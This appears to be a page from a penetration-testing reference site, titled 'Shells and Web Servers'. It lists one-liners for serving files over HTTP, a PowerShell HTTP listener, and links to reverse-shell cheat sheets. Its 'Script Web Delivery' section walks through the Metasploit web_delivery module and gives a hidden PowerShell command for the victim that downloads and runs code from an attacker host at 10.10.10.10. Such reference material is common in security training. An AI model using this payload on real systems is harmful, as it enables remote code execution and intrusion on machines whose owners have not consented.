---
title: Shells and Web Servers
category: Exploitation
order: 97
---

> **Reverse Shell One-Liners**

* [Reverse Shell One liners](https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html)
* [Bash, PHP, Netcat, Telnet, Perl, Ruby, Java, Python, Gawk](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

> **HTTP Servers One-Liners**

Python 2 | python -m SimpleHTTPServer 8000
Python 3 | python -m http.server 8000
ruby | <code> ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 8000, :DocumentRoot => Dir.pwd).start' </code>
ruby 1.9.2+ | ruby -run -ehttpd . -p8000
perl | <code> perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>8000); $s->mount("/"=>{path=>"."}); $s->start' </code>
php | php -S 127.0.0.1:8000
IIS Express | "C:\Program Files (x86)\IIS Express\iisexpress.exe" /path:C:\MyWeb /port:8000"
OpenSSL | <code> openssl req -newkey rsa:2048 -nodes -x509 -subj '/CN=name-you-want.example.com' -days 3650 -out server.cert -keyout server.key <br> openssl s_server -accept 7781 -cert server.cert -key server.key -WWW </code>


> **Powershell HTTP Servers**

{% highlight powershell %}
$Hso = New-Object Net.HttpListener
$Hso.Prefixes.Add("http://+:8000/")
$Hso.Start()
While ($Hso.IsListening) {
    $HC = $Hso.GetContext()
    $HRes = $HC.Response
    $HRes.Headers.Add("Content-Type","text/plain")
    $Buf = [Text.Encoding]::UTF8.GetBytes((GC (Join-Path $Pwd ($HC.Request).RawUrl)))
    $HRes.ContentLength64 = $Buf.Length
    $HRes.OutputStream.Write($Buf,0,$Buf.Length)
    $HRes.Close()
}
$Hso.Stop()
{% endhighlight %}

> **Script Web Delivery** 

On the attacker machine: 
{% highlight bash %}
msf > use exploit/multi/script/web_delivery
msf exploit(web_delivery) > show targets
            ...targets...
msf exploit(web_delivery) > set TARGET <target-id>
msf exploit(web_delivery) > show options
            ...show and set options...
msf exploit(web_delivery) > exploit
{% endhighlight %}

On the victim: 
{% highlight bash %}
powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://10.10.10.10:80/[randomstring]'))
{% endhighlight %}

Reference:
* [securitypadawan](https://securitypadawan.blogspot.com/2014/02/php-meterpreter-web-delivery.html)


> **Useful Resources** 

* [Powershell HTTPS Shell](http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-3.html)
* [powercat](https://www.sans.org/reading-room/whitepapers/testing/powercat-35807)
* [powercat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1)

